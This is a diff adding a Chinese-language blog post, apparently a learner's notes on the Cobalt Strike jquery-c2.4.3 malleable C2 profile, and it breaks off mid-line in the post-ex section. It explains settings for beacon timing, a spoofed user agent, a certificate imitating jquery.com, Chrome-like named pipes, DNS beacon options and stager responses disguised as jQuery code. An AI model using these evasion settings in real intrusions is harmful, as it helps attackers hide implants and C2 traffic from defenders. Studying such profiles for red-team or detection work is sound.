@@ -1,0 +1,485 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico">
+  <link rel="mask-icon" href="/images/favicon.ico" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="此处以最新版 jquery-c2.4.3.profile 为例，学习记录各项配置的作用。部分配置尚未研究清楚适用场景，后续继续学习再补充。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Cobalt Strike Profile 学习记录">
+<meta property="og:url" content="http://example.com/2021/04/21/yuque/Cobalt%20Strike%20Profile%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/index.html">
+<meta property="og:site_name" content="Darkb1rd">
+<meta property="og:description" content="此处以最新版 jquery-c2.4.3.profile 为例，学习记录各项配置的作用。部分配置尚未研究清楚适用场景，后续继续学习再补充。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-04-21T08:57:12.000Z">
+<meta property="article:modified_time" content="2021-04-21T09:00:48.621Z">
+<meta property="article:author" content="darkb1rd">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2021/04/21/yuque/Cobalt%20Strike%20Profile%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Cobalt Strike Profile 学习记录 | Darkb1rd</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Darkb1rd</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/21/yuque/Cobalt%20Strike%20Profile%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="darkb1rd">
+      <meta itemprop="description" content="孤舟蓑笠翁，独钓寒江雪">
+      <meta name="referrer" content="no-referrer" />
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Darkb1rd">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Cobalt Strike Profile 学习记录
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-04-21 16:57:12 / 修改时间：17:00:48" itemprop="dateCreated datePublished" datetime="2021-04-21T16:57:12+08:00">2021-04-21</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>此处以最新版 <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/threatexpress/malleable-c2/master/jquery-c2.4.3.profile">jquery-c2.4.3.profile</a> 为例，学习记录各项配置的作用。部分配置尚未研究清楚适用场景，后续继续学习再补充。</p>
+<a id="more"></a>
+
+<p>cobalt strike 4.3 官方文档：<a target="_blank" rel="noopener" href="https://cobaltstrike.com/downloads/csmanual43.pdf">https://cobaltstrike.com/downloads/csmanual43.pdf</a></p>
+<h1 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h1><ol>
+<li>关于参数与值：</li>
+</ol>
+<p>profile 文件将参数括在双引号中，而不是单引号中。例如：<br>正确： <code>set useragent &quot;SOME AGENT&quot;;</code> <br>错误： <code>set useragent &#39;SOME AGENT&#39;;</code></p>
+<ol start="2">
+<li>一些特殊字符不需要转义，例如： <code>!@#$%^&amp;*()</code></li>
+<li>值可以使用分号， 例如：</li>
+</ol>
+<p><code>prepend &quot;This is an example;&quot;;</code></p>
+<ol start="4">
+<li>值中的双引号需要转义, 例如：</li>
+</ol>
+<p><code>append &quot;here is \&quot;some\&quot; stuff&quot;;</code></p>
+<ol start="5">
+<li>双斜杠表示单斜杠：例如：</li>
+</ol>
+<p><code>append &quot;more \\ stuff&quot;;</code></p>
+<ol start="6">
+<li>编译后的 <code>.http-post.client</code>  必须小于 252 个字节。</li>
+</ol>
+<h1 id="配置解读"><a href="#配置解读" class="headerlink" title="配置解读"></a>配置解读</h1><p><code>set sample_name &quot;jQuery CS 4.3 Profile&quot;;</code></p>
+<blockquote>
+<p>设置配置文件名称，此处会显示在输出的报告中。</p>
+</blockquote>
+<p><code>set sleeptime &quot;45000&quot;;</code></p>
+<blockquote>
+<p>设置上线后的睡眠时间，45000 单位是毫秒。 此处不要设置为 0， 设置为 0 后木马无法上线。cobalt strike 默认的睡眠时间是 60000ms 。</p>
+</blockquote>
+<p><code>set jitter &quot;37&quot;;</code></p>
+<blockquote>
+<p>设置抖动频率，默认是 0.</p>
+</blockquote>
+<p><code>set data_jitter &quot;100&quot;;</code></p>
+<blockquote>
+<p>设置数据抖动大小。设置后，在请求的过程中，会追加随机长度（小于设置的值）的随机字符串。</p>
+</blockquote>
+<p><code>set headers_remove &quot;Strict-Transport-Security, header2, header3&quot;;</code></p>
+<blockquote>
+<p>全局选项，强制 Beacon 的 WinINet 在 HTTP/HTTPS 请求中删除指定的请求头。</p>
+</blockquote>
+<p><code>set useragent &quot;Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko&quot;;</code></p>
+<blockquote>
+<p>设置请求的 UA，此处可以结合 nginx 反向代理，对 stage 进行隐藏。 此项默认是 IE 的随机 UA，在 CS 小于 4.2 的版本最大字符是 128， CS4.2 以上的版本最大字符是 255。</p>
+</blockquote>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">https-certificate &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">## 选项 1) 使用可信的签名证书</span></span><br><span class="line">    <span class="comment">## 使用 keytool 创建一个 Java Keystore 文件.</span></span><br><span class="line">    <span class="comment">## 参考： https://www.cobaltstrike.com/help-malleable-c2#validssl</span></span><br><span class="line">    <span class="comment">## 参考： https://github.com/killswitch-GUI/CobaltStrike-ToolKit/blob/master/HTTPsC2DoneRight.sh</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">## 选项 2) 使用自创建的自签名证书</span></span><br><span class="line">    <span class="comment">## 使用 keytool 导入自签名证书</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#set keystore &quot;/pathtokeystore&quot;;   ：设置keystore路径</span></span><br><span class="line">    <span class="comment">#set password &quot;password&quot;;					 ：设置证书密码</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">## 选项3 3) 使用Cobalt Strike自签名证书</span></span><br><span class="line">    <span class="attribute">set</span> C   <span class="string">&quot;US&quot;</span>;</span><br><span class="line">    <span class="attribute">set</span> CN  <span class="string">&quot;jquery.com&quot;</span>;</span><br><span class="line">    <span class="attribute">set</span> O   <span class="string">&quot;jQuery&quot;</span>;</span><br><span class="line">    <span class="attribute">set</span> OU  <span class="string">&quot;Certificate Authority&quot;</span>;</span><br><span class="line">    <span class="attribute">set</span> validity <span class="string">&quot;365&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>SSL 证书配置，用于对 C2 的 https 监听配置签名、自签名证书。默认是所有的证书值均为空。这里 CS 官方建议是：<strong>使用可信的证书签名</strong>。</p>
+</blockquote>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">set</span> tcp_port <span class="string">&quot;42585&quot;</span>;</span><br><span class="line"><span class="attribute">set</span> tcp_frame_header <span class="string">&quot;\x80&quot;</span>;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>TCP Beacon 的相关设置，tcp 监听端口详细信息可以参考：<a target="_blank" rel="noopener" href="https://blog.cobaltstrike.com/2019/01/02/cobalt-strike-3-13-why-do-we-argue/">https://blog.cobaltstrike.com/2019/01/02/cobalt-strike-3-13-why-do-we-argue/</a>  、 <a target="_blank" rel="noopener" href="https://www.cobaltstrike.com/help-tcp-beacon">https://www.cobaltstrike.com/help-tcp-beacon</a> 。 tcp_frame_header 可以在 tcp 信息前追加设定的字符。Cobalt Strike 默认使用的 tcp 监听端口为 4444, 且不在信息前追加字符。</p>
+</blockquote>
+<p>官方指导意见：不建议使用 4444 端口进行监听。建议使用高端口监听。</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">set</span> pipename         <span class="string">&quot;mojo.5688.8052.183894939787088877##&quot;</span>; <span class="comment"># Common Chrome named pipe</span></span><br><span class="line"><span class="attribute">set</span> pipename_stager  <span class="string">&quot;mojo.5688.8052.35780273329370473##&quot;</span>; <span class="comment"># Common Chrome named pipe</span></span><br><span class="line"><span class="attribute">set</span> smb_frame_header <span class="string">&quot;\x80&quot;</span>;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>SMB Beacon 的相关设置。使用 SMB 进行对等通信。CS4.1 版本之后加入 SMB Frame Header 选项。CS 默认使用的管道名为： <code>msagent_##</code> ,pipename*stager 为： <code>status*##</code>  。</p>
+</blockquote>
+<p>官方建议：不要使用已经存在的命名管道，beacon 不会检测是否与已存在的管道名冲突。配置文件使用者要把 <code>##</code>  替换成数字</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">dns-beacon &#123;</span><br><span class="line">    <span class="comment"># Options moved into &quot;dns-beacon&quot; group in version 4.3</span></span><br><span class="line">    <span class="attribute">set</span> dns_idle           <span class="string">&quot;74.125.196.113&quot;</span>; <span class="comment">#google.com (change this to match your campaign)</span></span><br><span class="line">    <span class="attribute">set</span> dns_max_txt        <span class="string">&quot;252&quot;</span>;</span><br><span class="line">    <span class="attribute">set</span> dns_sleep          <span class="string">&quot;0&quot;</span>; <span class="comment">#    Force a sleep prior to each individual DNS request. (in milliseconds)</span></span><br><span class="line">    <span class="attribute">set</span> dns_ttl            <span class="string">&quot;5&quot;</span>;</span><br><span class="line">    <span class="attribute">set</span> maxdns             <span class="string">&quot;255&quot;</span>;</span><br><span class="line">    <span class="attribute">set</span> dns_stager_prepend <span class="string">&quot;.resources.123456.&quot;</span>;</span><br><span class="line">    <span class="attribute">set</span> dns_stager_subhost <span class="string">&quot;.feeds.123456.&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># DNS subhosts override options, added in version 4.3</span></span><br><span class="line">    <span class="attribute">set</span> beacon           <span class="string">&quot;a.bc.&quot;</span>;</span><br><span class="line">    <span class="attribute">set</span> get_A            <span class="string">&quot;b.1a.&quot;</span>;</span><br><span class="line">    <span class="attribute">set</span> get_AAAA         <span class="string">&quot;c.4a.&quot;</span>;</span><br><span class="line">    <span class="attribute">set</span> get_TXT          <span class="string">&quot;d.tx.&quot;</span>;</span><br><span class="line">    <span class="attribute">set</span> put_metadata     <span class="string">&quot;e.md.&quot;</span>;</span><br><span class="line">    <span class="attribute">set</span> put_output       <span class="string">&quot;f.po.&quot;</span>;</span><br><span class="line">    <span class="attribute">set</span> ns_response      <span class="string">&quot;zero&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>DNS Beacon   的相关配置。DNS beacon 会生成大量的 DNS 请求。DNS  Beacon 最好用作低速备份 C2 通道。</p>
+</blockquote>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">set</span> ssh_banner        <span class="string">&quot;OpenSSH_7.4 Debian (protocol 2.0)&quot;</span>;</span><br><span class="line"><span class="attribute">set</span> ssh_pipename      <span class="string">&quot;wkssvc##&quot;</span>;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>SSH Beacon 的相关配置。使用 SSH 协议进行 P2P 对等通信。Cobalt Strike 4.1 版本开始使用。</p>
+</blockquote>
+<p><code>set host_stage &quot;false&quot;;</code></p>
+<blockquote>
+<p>不建议使用 host_stage。建议使用 stageles 有效负载，现在是 Cobalt Strike 的默认选项。</p>
+</blockquote>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">http-stager &#123;</span><br><span class="line">    <span class="comment"># x86的请求地址</span></span><br><span class="line">    <span class="attribute">set</span> uri_x86 <span class="string">&quot;/jquery-3.3.1.slim.min.js&quot;</span>;</span><br><span class="line">  	<span class="comment"># x64的请求地址</span></span><br><span class="line">    <span class="attribute">set</span> uri_x64 <span class="string">&quot;/jquery-3.3.2.slim.min.js&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line">    	  <span class="comment"># 服务端的相关配置</span></span><br><span class="line">    		<span class="comment"># 设置header 信息</span></span><br><span class="line">        <span class="attribute">header</span> <span class="string">&quot;Server&quot;</span> <span class="string">&quot;NetDNA-cache/2.2&quot;</span>;</span><br><span class="line">        <span class="attribute">header</span> <span class="string">&quot;Cache-Control&quot;</span> <span class="string">&quot;max-age=0, no-cache&quot;</span>;</span><br><span class="line">        <span class="attribute">header</span> <span class="string">&quot;Pragma&quot;</span> <span class="string">&quot;no-cache&quot;</span>;</span><br><span class="line">        <span class="attribute">header</span> <span class="string">&quot;Connection&quot;</span> <span class="string">&quot;keep-alive&quot;</span>;</span><br><span class="line">        <span class="attribute">header</span> <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;application/javascript; charset=utf-8&quot;</span>;</span><br><span class="line">        <span class="section">output</span> &#123;</span><br><span class="line">            <span class="comment">## 在实际的请求中追加jquery字符串进行伪装。</span></span><br><span class="line">            <span class="attribute">prepend</span> <span class="string">&quot;!function(e,t)&#123;\&quot;use strict\&quot;;\&quot;object\&quot;==typeof module&amp;&amp;\&quot;object\&quot;==typeof module.exports?module.exports=e.document?t(e,!0):function(e)&#123;if(!e.document)throw new Error(\&quot;jQuery requires a window with a document\&quot;);return t(e)&#125;:t(e)&#125;(\&quot;undefined\&quot;!=typeof window?window:this,function(e,t)&#123;\&quot;use strict\&quot;;var n=[],r=e.document,i=Object.getPrototypeOf,o=n.slice,a=n.concat,s=n.push,u=n.indexOf,l=&#123;&#125;,c=l.toString,f=l.hasOwnProperty,p=f.toString,d=p.call(Object),h=&#123;&#125;,g=function e(t)&#123;return\&quot;function\&quot;==typeof t&amp;&amp;\&quot;number\&quot;!=typeof t.nodeType&#125;,y=function e(t)&#123;return null!=t&amp;&amp;t===t.window&#125;,v=&#123;type:!0,src:!0,noModule:!0&#125;;function m(e,t,n)&#123;var i,o=(t=t||r).createElement(\&quot;script\&quot;);if(o.text=e,n)for(i in v)n[i]&amp;&amp;(o[i]=n[i]);t.head.appendChild(o).parentNode.removeChild(o)&#125;function x(e)&#123;return null==e?e+\&quot;\&quot;:\&quot;object\&quot;==typeof e||\&quot;function\&quot;==typeof e?l[c.call(e)]||\&quot;object\&quot;:typeof e&#125;var b=\&quot;3.3.1\&quot;,w=function(e,t)&#123;return new w.fn.init(e,t)&#125;,T=/^[\\s\\uFEFF\\xA0]+|[\\s\\uFEFF\\xA0]+$/g;w.fn=w.prototype=&#123;jquery:\&quot;3.3.1\&quot;,constructor:w,length:0,toArray:function()&#123;return o.call(this)&#125;,get:function(e)&#123;return null==e?o.call(this):e&lt;0?this[e+this.length]:this[e]&#125;,pushStack:function(e)&#123;var t=w.merge(this.constructor(),e);return t.prevObject=this,t&#125;,each:function(e)&#123;return w.each(this,e)&#125;,map:function(e)&#123;return this.pushStack(w.map(this,function(t,n)&#123;return e.call(t,n,t)&#125;))&#125;,slice:function()&#123;return this.pushStack(o.apply(this,arguments))&#125;,first:function()&#123;return this.eq(0)&#125;,last:function()&#123;return this.eq(-1)&#125;,eq:function(e)&#123;var t=this.length,n=+e+(e&lt;0?t:0);return this.pushStack(n&gt;=0&amp;&amp;n&lt;t?[this[n]]:[])&#125;,end:function()&#123;return this.prevObject||this.constructor()&#125;,push:s,sort:n.sort,splice:n.splice&#125;,w.extend=w.fn.extend=function()&#123;var e,t,n,r,i,o,a=arguments[0]||&#123;&#125;,s=1,u=arguments.length,l=!1;for(\&quot;boolean\&quot;==typeof a&amp;&amp;(l=a,a=arguments[s]||&#123;&#125;,s++),\&quot;object\&quot;==typeof a||g(a)||(a=&#123;&#125;),s===u&amp;&amp;(a=this,s--);s&lt;u;s++)if(null!=(e=arguments[s]))for(t in e)n=a[t],a!==(r=e[t])&amp;&amp;(l&amp;&amp;r&amp;&amp;(w.isPlainObject(r)||(i=Array.isArray(r)))?(i?(i=!1,o=n&amp;&amp;Array.isArray(n)?n:[]):o=n&amp;&amp;w.isPlainObject(n)?n:&#123;&#125;,a[t]=w.extend(l,o,r)):void 0!==r&amp;&amp;(a[t]=r));return a&#125;,w.extend(&#123;expando:\&quot;jQuery\&quot;+(\&quot;3.3.1\&quot;+Math.random()).replace(/\\D/g,\&quot;\&quot;),isReady:!0,error:function(e)&#123;throw new Error(e)&#125;,noop:function()&#123;&#125;,isPlainObject:function(e)&#123;var t,n;return!(!e||\&quot;[object Object]\&quot;!==c.call(e))&amp;&amp;(!(t=i(e))||\&quot;function\&quot;==typeof(n=f.call(t,\&quot;constructor\&quot;)&amp;&amp;t.constructor)&amp;&amp;p.call(n)===d)&#125;,isEmptyObject:function(e)&#123;var t;for(t in e)return!1;return!0&#125;,globalEval:function(e)&#123;m(e)&#125;,each:function(e,t)&#123;var n,r=0;if(C(e))&#123;for(n=e.length;r&lt;n;r++)if(!1===t.call(e[r],r,e[r]))break&#125;else for(r in e)if(!1===t.call(e[r],r,e[r]))break;return e&#125;,trim:function(e)&#123;return null==e?\&quot;\&quot;:(e+\&quot;\&quot;).replace(T,\&quot;\&quot;)&#125;,makeArray:function(e,t)&#123;var n=t||[];return null!=e&amp;&amp;(C(Object(e))?w.merge(n,\&quot;string\&quot;==typeof e?[e]:e):s.call(n,e)),n&#125;,inArray:function(e,t,n)&#123;return null==t?-1:u.call(t,e,n)&#125;,merge:function(e,t)&#123;for(var n=+t.length,r=0,i=e.length;r&lt;n;r++)e[i++]=t[r];return e.length=i,e&#125;,grep:function(e,t,n)&#123;for(var r,i=[],o=0,a=e.length,s=!n;o&lt;a;o++)(r=!t(e[o],o))!==s&amp;&amp;i.push(e[o]);return i&#125;,map:function(e,t,n)&#123;var r,i,o=0,s=[];if(C(e))for(r=e.length;o&lt;r;o++)null!=(i=t(e[o],o,n))&amp;&amp;s.push(i);else for(o in e)null!=(i=t(e[o],o,n))&amp;&amp;s.push(i);return a.apply([],s)&#125;,guid:1,support:h&#125;),\&quot;function\&quot;==typeof Symbol&amp;&amp;(w.fn[Symbol.iterator]=n[Symbol.iterator]),w.each(\&quot;Boolean Number String Function Array Date RegExp Object Error Symbol\&quot;.split(\&quot; \&quot;),function(e,t)&#123;l[\&quot;[object \&quot;+t+\&quot;]\&quot;]=t.toLowerCase()&#125;);function C(e)&#123;var t=!!e&amp;&amp;\&quot;length\&quot;in e&amp;&amp;e.length,n=x(e);return!g(e)&amp;&amp;!y(e)&amp;&amp;(\&quot;array\&quot;===n||0===t||\&quot;number\&quot;==typeof t&amp;&amp;t&gt;0&amp;&amp;t-1 in e)&#125;var E=function(e)&#123;var t,n,r,i,o,a,s,u,l,c,f,p,d,h,g,y,v,m,x,b=\&quot;sizzle\&quot;+1*new Date,w=e.document,T=0,C=0,E=ae(),k=ae(),S=ae(),D=function(e,t)&#123;return e===t&amp;&amp;(f=!0),0&#125;,N=&#123;&#125;.hasOwnProperty,A=[],j=A.pop,q=A.push,L=A.push,H=A.slice,O=function(e,t)&#123;for(var n=0,r=e.length;n&lt;r;n++)if(e[n]===t)return n;return-1&#125;,P=\&quot;\r&quot;</span>;</span><br><span class="line">            <span class="comment"># 1st Line</span></span><br><span class="line">            <span class="attribute">prepend</span> <span class="string">&quot;/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */&quot;</span>;</span><br><span class="line">            <span class="attribute">append</span> <span class="string">&quot;\&quot;.(o=t.documentElement,Math.max(t.body[\&quot;scroll\&quot;+e],o[\&quot;scroll\&quot;+e],t.body[\&quot;offset\&quot;+e],o[\&quot;offset\&quot;+e],o[\&quot;client\&quot;+e])):void 0===i?w.css(t,n,s):w.style(t,n,i,s)&#125;,t,a?i:void 0,a)&#125;&#125;)&#125;),w.each(\&quot;blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu\&quot;.split(\&quot; \&quot;),function(e,t)&#123;w.fn[t]=function(e,n)&#123;return arguments.length&gt;0?this.on(t,null,e,n):this.trigger(t)&#125;&#125;),w.fn.extend(&#123;hover:function(e,t)&#123;return this.mouseenter(e).mouseleave(t||e)&#125;&#125;),w.fn.extend(&#123;bind:function(e,t,n)&#123;return this.on(e,null,t,n)&#125;,unbind:function(e,t)&#123;return this.off(e,null,t)&#125;,delegate:function(e,t,n,r)&#123;return this.on(t,e,n,r)&#125;,undelegate:function(e,t,n)&#123;return 1===arguments.length?this.off(e,\&quot;**\&quot;):this.off(t,e||\&quot;**\&quot;,n)&#125;&#125;),w.proxy=function(e,t)&#123;var n,r,i;if(\&quot;string\&quot;==typeof t&amp;&amp;(n=e[t],t=e,e=n),g(e))return r=o.call(arguments,2),i=function()&#123;return e.apply(t||this,r.concat(o.call(arguments)))&#125;,i.guid=e.guid=e.guid||w.guid++,i&#125;,w.holdReady=function(e)&#123;e?w.readyWait++:w.ready(!0)&#125;,w.isArray=Array.isArray,w.parseJSON=JSON.parse,w.nodeName=N,w.isFunction=g,w.isWindow=y,w.camelCase=G,w.type=x,w.now=Date.now,w.isNumeric=function(e)&#123;var t=w.type(e);return(\&quot;number\&quot;===t||\&quot;string\&quot;===t)&amp;&amp;!isNaN(e-parseFloat(e))&#125;,\&quot;function\&quot;==typeof define&amp;&amp;define.amd&amp;&amp;define(\&quot;jquery\&quot;,[],function()&#123;return w&#125;);var Jt=e.jQuery,Kt=e.$;return w.noConflict=function(t)&#123;return e.$===w&amp;&amp;(e.$=Kt),t&amp;&amp;e.jQuery===w&amp;&amp;(e.jQuery=Jt),w&#125;,t||(e.jQuery=e.$=w),w&#125;);&quot;</span>;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="section">client</span> &#123;</span><br><span class="line">    		<span class="comment"># 设置客户端请求的请求头信息。</span></span><br><span class="line">        <span class="attribute">header</span> <span class="string">&quot;Accept&quot;</span> <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>;</span><br><span class="line">        <span class="attribute">header</span> <span class="string">&quot;Accept-Language&quot;</span> <span class="string">&quot;en-US,en;q=0.5&quot;</span>;</span><br><span class="line">        <span class="comment">#header &quot;Host&quot; &quot;code.jquery.com&quot;;</span></span><br><span class="line">        <span class="attribute">header</span> <span class="string">&quot;Referer&quot;</span> <span class="string">&quot;http://code.jquery.com/&quot;</span>;</span><br><span class="line">        <span class="attribute">header</span> <span class="string">&quot;Accept-Encoding&quot;</span> <span class="string">&quot;gzip, deflate&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>http stager 的相关配置。</p>
+</blockquote>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">post-ex &#123;</span><br><span class="line">    <span class="comment"># Optionally specify non-existent filepath to force manual specification based on the Beacon host&#x27;s running processes</span></span><br><span class="line">    <span class="attribute">set</span> spawnto_x86 <span class="string">&quot;%windir%\\syswow64\\dllhost.exe&quot;</span>;</span><br><span class="line">    <span class="comment"># Hardcode paths like C:\\Windows\\System32\\dllhost.exe to avoid potential detections for %SYSNATIVE% use. !! This will break when attempting to spawn a 64bit post-ex job from a 32bit Beacon.</span></span><br><span class="line">    <span class="attribute">set</span> spawnto_x64 <span class="string">&quot;%windir%\\sysnative\\dllhost.exe&quot;</span>;</span><br><span class="line">    <span class="comment"># change the permissions and content of our post-ex DLLs</span></span><br><span class="line">    <span class="attribute">set</span> 